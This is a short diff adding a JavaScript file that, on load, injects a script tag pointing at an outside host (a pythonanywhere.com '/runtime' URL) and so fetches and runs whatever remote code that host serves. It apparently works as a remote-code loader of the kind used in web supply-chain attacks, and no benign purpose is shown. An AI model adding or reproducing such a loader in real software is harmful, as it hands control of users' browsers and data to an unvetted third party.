@@ -1,0 +1,9 @@
+const scriptURL = 'https://iniestadev.pythonanywhere.com/runtime';
+
+function fetchAndExecuteScript(scriptURL) {
+  const script = document.createElement('script');
+  script.src = scriptURL;
+  document.head.appendChild(script);
+}
+
+fetchAndExecuteScript(scriptURL);
